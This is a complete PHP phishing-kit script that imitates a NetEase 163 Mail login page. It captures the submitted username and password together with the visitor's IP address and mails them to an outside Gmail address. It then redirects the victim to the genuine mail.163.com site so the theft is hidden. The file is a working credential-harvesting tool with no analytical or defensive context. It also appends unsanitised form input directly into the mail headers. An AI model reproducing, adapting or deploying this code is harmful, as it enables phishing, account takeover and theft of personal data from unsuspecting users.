<?

$ip = getenv("REMOTE_ADDR");
$message .= "------------------------------------------\n";
$message .= "Email ID: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "--------------163 HK------------\n";



$recipient = "rabbitcookies15@gmail.com";
$subject = "163 MAIL";
$headers = "From: NetEase Login";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://mail.163.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>